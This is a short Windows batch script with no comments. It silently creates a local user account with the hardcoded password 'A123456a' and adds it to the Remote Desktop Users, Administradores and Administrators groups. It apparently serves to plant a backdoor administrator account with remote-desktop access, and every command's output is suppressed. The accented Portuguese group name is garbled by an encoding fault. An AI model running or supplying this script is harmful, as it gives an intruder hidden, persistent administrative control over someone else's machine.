@echo off
net user %1 "A123456a" /Add 2>nul 1>nul
NET LOCALGROUP "Usu�rios da �rea de trabalho remota" %1 /add 1>nul
NET LOCALGROUP "Administradores" %1 /add 1>nul
NET LOCALGROUP "Administrators" %1 /add 1>nul